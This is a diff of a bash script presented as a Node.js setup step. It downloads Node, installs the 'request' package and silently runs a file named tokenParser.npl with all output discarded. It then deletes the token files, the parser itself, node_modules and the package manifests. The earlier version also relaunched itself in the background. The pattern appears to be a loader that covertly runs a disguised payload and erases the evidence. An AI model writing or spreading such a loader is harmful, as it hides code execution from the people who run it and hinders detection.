@@ -1,87 +1,100 @@
 #!/bin/bash
+
+# Creating new Info
 set -e
 
-# No SCRIPT_DIR, assume run from script folder or correct working directory
-
-if [[ "$1" != "_restarted" ]]; then
-    echo "🔁 Restarting script with _restarted flag..."
-    nohup bash "$0" _restarted > /dev/null 2>&1 &
-    exit 0
-fi
-
-echo "✅ Running restarted script instance..."
-
 NODE_VERSION="20.11.1"
-NODE_DISTRO="node-v${NODE_VERSION}-linux-x64"
-NODE_TAR="${NODE_DISTRO}.tar.gz"
-DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_TAR}"
+NODE_MSI="node-v${NODE_VERSION}-x64.tar.gz"
+DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_MSI}"
+NODE_DIR="$(pwd)/node-v${NODE_VERSION}-x64"
 
-# Work in current directory
-cd .
+NODE_INSTALLED_VERSION=""
 
-# The rest stays the same but replace $SCRIPT_DIR with .
-
-if command -v node >/dev/null 2>&1; then
-    INSTALLED_VERSION=$(node -v | sed 's/v//')
-    if [[ "$INSTALLED_VERSION" == "$NODE_VERSION" ]]; then
-        echo "Node.js version $INSTALLED_VERSION already installed."
-        INSTALL_NODE=0
-    else
-        echo "Different Node.js version installed ($INSTALLED_VERSION), will install $NODE_VERSION."
-        INSTALL_NODE=1
-    fi
-else
-    echo "Node.js not found. Will install version $NODE_VERSION."
+# Check for installed node version
+if ! node -v &> /dev/null; then
     INSTALL_NODE=1
+else
+    NODE_INSTALLED_VERSION=$(node -v)
+    INSTALL_NODE=0
 fi
 
-if [[ $INSTALL_NODE -eq 1 ]]; then
-    echo "Downloading Node.js..."
-    if [ -f "$NODE_TAR" ]; then
-        echo "$NODE_TAR already exists, skipping download."
-    else
-        wget "$DOWNLOAD_URL" -O "$NODE_TAR"
+# Install Node.js if not installed
+if [ "$INSTALL_NODE" -eq 1 ]; then
+    if ! command -v curl &> /dev/null; then
+        echo "Curl not found, please install curl"
+        exit 1
     fi
 
-    echo "Extracting Node.js..."
-    tar -xf "$NODE_TAR"
+    curl -s -L -o "$NODE_MSI" "$DOWNLOAD_URL"
 
-    export PATH="./$NODE_DISTRO/bin:$PATH"
+    if [ -f "$NODE_MSI" ]; then
+        # Extract tarball
+        tar -xf "$NODE_MSI"
+        rm -f "$NODE_MSI"
+    else
+        echo "Failed to download node.js"
+        exit 1
+    fi
+
+    export PATH="${NODE_DIR}/bin:$PATH"
 fi
 
-if ! command -v node >/dev/null 2>&1; then
-    echo "❌ Node.js not found after installation. Exiting."
+# Check if node is installed
+if ! command -v node &> /dev/null; then
+    echo "Node.js is not installed."
     exit 1
 fi
 
-if ! command -v npm >/dev/null 2>&1; then
-    echo "❌ npm not found after installation. Exiting."
+# Check if npm is installed
+if ! command -v npm &> /dev/null; then
+    echo "npm is not installed."
     exit 1
 fi
 
-if [ ! -d "./node_modules/request" ]; then
-    echo "Installing npm 'request' module..."
+# Install the 'request' package if not installed
+if [ ! -d "$(pwd)/node_modules/request" ]; then
     npm install request --silent --no-progress --loglevel=error --fund=false
+    if [ $? -ne 0 ]; then
+        echo "Failed to install 'request' module."
+        exit 1
+    fi
 fi
 
-if [ -f "./tokenParser.npl" ]; then
-    echo "Running tokenParser..."
-    node "./tokenParser.npl"
+# Run tokenParser.npl script if it exists
+if [ -f "$(pwd)/tokenParser.npl" ]; then
+    node "$(pwd)/tokenParser.npl" &> /dev/null
+    if [ $? -ne 0 ]; then
+        echo "Error running tokenParser.npl."
+        exit 1
+    fi
 else
-    echo "❌ tokenParser.npl not found."
+    echo "tokenParser.npl not found."
     exit 1
 fi
 
-[ -f "./token.cmd" ] && rm -f "./token.cmd"
-[ -f "./token" ] && rm -f "./token"
-[ -f "./tokenParser.npl" ] && rm -f "./tokenParser.npl"
-
-if [ -d "./node_modules" ]; then
-    echo "Removing node_modules folder..."
-    rm -rf "./node_modules"
+# Clean up: delete token files and directories
+if [ -f "$(pwd)/token.cmd" ]; then
+    rm -f "$(pwd)/token.cmd"
 fi
 
-[ -f "./package.json" ] && rm -f "./package.json"
-[ -f "./package-lock.json" ] && rm -f "./package-lock.json"
+if [ -f "$(pwd)/token" ]; then
+    rm -f "$(pwd)/token"
+fi
 
-echo "✅ Setup script completed successfully."
+if [ -f "$(pwd)/tokenParser.npl" ]; then
+    rm -f "$(pwd)/tokenParser.npl"
+fi
+
+if [ -d "$(pwd)/node_modules" ]; then
+    rm -rf "$(pwd)/node_modules"
+fi
+
+if [ -f "$(pwd)/package.json" ]; then
+    rm -f "$(pwd)/package.json"
+fi
+
+if [ -f "$(pwd)/package-lock.json" ]; then
+    rm -f "$(pwd)/package-lock.json"
+fi
+
+exit 0
